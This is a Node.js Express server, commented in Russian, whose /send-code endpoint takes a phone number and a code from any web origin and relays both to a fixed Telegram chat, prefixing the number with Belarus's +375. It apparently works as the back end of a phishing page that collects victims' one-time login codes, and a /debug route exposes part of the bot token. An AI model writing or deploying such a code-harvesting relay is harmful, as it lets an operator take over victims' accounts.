const express = require('express');
const fetch = require('node-fetch');
const app = express();
app.use(express.json());

app.use((req, res, next) => {
  res.header('Access-Control-Allow-Origin', '*');
  res.header('Access-Control-Allow-Headers', 'Content-Type');
  res.header('Access-Control-Allow-Methods', 'GET, POST, OPTIONS');
  if (req.method === 'OPTIONS') return res.sendStatus(200);
  next();
});

// Проверка переменных при СТАРТЕ сервера
const TOKEN = process.env.TELEGRAM_BOT_TOKEN;
const CHAT_ID = process.env.TELEGRAM_CHAT_ID;

console.log('========================================');
console.log('ЗАПУСК СЕРВЕРА');
console.log('TOKEN exists:', !!TOKEN);
console.log('TOKEN starts:', TOKEN ? TOKEN.substring(0, 15) : 'НЕТ');
console.log('CHAT_ID:', CHAT_ID || 'НЕТ');
console.log('========================================');

app.get('/debug', (req, res) => {
  res.json({
    token_exists: !!TOKEN,
    token_start: TOKEN ? TOKEN.substring(0, 15) + '...' : 'НЕТ',
    chat_id: CHAT_ID || 'НЕТ',
    all_telegram_keys: Object.keys(process.env).filter(function(k) {
      return k.indexOf('TELEGRAM') !== -1;
    })
  });
});

app.post('/send-code', async (req, res) => {
  const body = req.body || {};
  const phone = body.phone;
  const code = body.code;

  console.log('=== ЗАПРОС ===', phone, code);

  if (!TOKEN || !CHAT_ID) {
    console.log('ОШИБКА: переменные не заданы');
    return res.status(500).json({ error: 'Переменные не заданы' });
  }

  if (!phone || !code) {
    return res.status(400).json({ error: 'Нужны phone и code' });
  }

  try {
    const url = 'https://api.telegram.org/bot' + TOKEN + '/sendMessage';
    const response = await fetch(url, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        chat_id: CHAT_ID,
        text: '🔐 Код для +375' + phone + ': *' + code + '*',
        parse_mode: 'Markdown'
      })
    });

    const data = await response.json();
    console.log('ОТВЕТ TELEGRAM:', JSON.stringify(data));

    if (data.ok) {
      res.json({ success: true });
    } else {
      res.status(500).json({ error: data.description || 'Ошибка Telegram' });
    }
  } catch (err) {
    console.log('СЕТЕВАЯ ОШИБКА:', err.message);
    res.status(500).json({ error: err.message });
  }
});

app.get('/', function(req, res) {
  res.send('OK. Сервер работает. /debug для проверки.');
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, function() {
  console.log('Сервер слушает порт', PORT);
});
